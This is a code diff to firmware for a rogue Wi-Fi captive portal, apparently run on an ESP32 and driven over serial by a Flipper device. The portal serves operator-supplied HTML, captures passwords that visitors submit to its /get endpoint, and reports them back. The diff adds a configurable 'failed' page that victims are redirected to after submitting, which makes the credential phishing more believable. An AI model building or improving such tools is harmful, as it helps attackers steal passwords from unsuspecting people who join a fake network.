@@ -2,6 +2,7 @@
 #include <AsyncTCP.h>
 #include <DNSServer.h>
 #include <WiFi.h>
+#include <cstring>
 
 #define MAX_HTML_SIZE 20000
 
@@ -14,6 +15,7 @@
 #define BAD 2
 
 #define SET_HTML_CMD "sethtml="
+#define SET_FAILED_CMD "setfailed="
 #define SET_AP_CMD "setap="
 #define RESET_CMD "reset"
 #define START_CMD "start"
@@ -32,6 +34,8 @@ bool password_received = false;
 
 char apName[30] = "";
 char index_html[MAX_HTML_SIZE] = "TEST";
+char failed_html[MAX_HTML_SIZE] = "";
+bool has_failed_html = false;
 
 // RESET
 void (*resetFunction)(void) = 0;
@@ -71,6 +75,14 @@ void setupServer() {
     Serial.println("client connected");
   });
 
+  server.on("/failed.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+    if (has_failed_html) {
+      request->send_P(200, "text/html", failed_html);
+    } else {
+      request->send(404, "text/plain", "Not Found");
+    }
+  });
+
   server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
     String inputMessage;
     String inputParam;
@@ -88,9 +100,15 @@ void setupServer() {
       password = inputMessage;
       password_received = true;
     }
-    request->send(
-        200, "text/html",
-        "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
+    if (has_failed_html) {
+      request->send(
+          200, "text/html",
+          "<html><head><script>setTimeout(() => { window.location.href ='/failed.html' }, 100);</script></head><body></body></html>");
+    } else {
+      request->send(
+          200, "text/html",
+          "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
+    }
   });
   Serial.println("web server up");
 }
@@ -130,6 +148,8 @@ void getInitInput() {
   Serial.println("Waiting for HTML");
   bool has_ap = false;
   bool has_html = false;
+  has_failed_html = false;
+  memset(failed_html, 0, sizeof(failed_html));
   while (!has_html || !has_ap) {
       if (Serial.available() > 0) {
         String flipperMessage = Serial.readString();
@@ -139,6 +159,22 @@ void getInitInput() {
           strncpy(index_html, serialMessage, strlen(serialMessage) - 1);
           has_html = true;
           Serial.println("html set");
+        } else if (strncmp(serialMessage, SET_FAILED_CMD, strlen(SET_FAILED_CMD)) ==
+                   0) {
+          serialMessage += strlen(SET_FAILED_CMD);
+          size_t message_len = strlen(serialMessage);
+          memset(failed_html, 0, sizeof(failed_html));
+          has_failed_html = false;
+          if (message_len > 0) {
+            size_t copy_len = message_len - 1;
+            if (copy_len >= sizeof(failed_html)) {
+              copy_len = sizeof(failed_html) - 1;
+            }
+            strncpy(failed_html, serialMessage, copy_len);
+            failed_html[copy_len] = '\0';
+            has_failed_html = copy_len > 0;
+          }
+          Serial.println("failed html set");
         } else if (strncmp(serialMessage, SET_AP_CMD, strlen(SET_AP_CMD)) ==
                    0) {
           serialMessage += strlen(SET_AP_CMD);
